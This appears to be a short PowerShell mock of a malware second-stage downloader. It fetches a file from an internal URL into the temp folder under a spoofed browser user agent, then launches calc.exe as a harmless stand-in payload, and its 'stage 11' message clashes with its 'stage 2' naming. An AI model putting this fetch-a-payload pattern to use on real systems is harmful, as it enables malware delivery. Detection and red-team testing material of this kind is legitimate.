
$DownloadUrl = "http://internal.corp/stage2.ps1"
$OutputPath = "$env:TEMP\stage2.bin"
$ConnectionTimeout = 68
$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$StageResult = Get-Stage2Payload -SourceUrl $DownloadUrl -DestinationPath $OutputPath -TimeoutSec $ConnectionTimeout -UserAgent $BrowserAgent
if ($StageResult) {
    Start-Process -FilePath "calc.exe"
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Write-Output "stage 11 initialized"
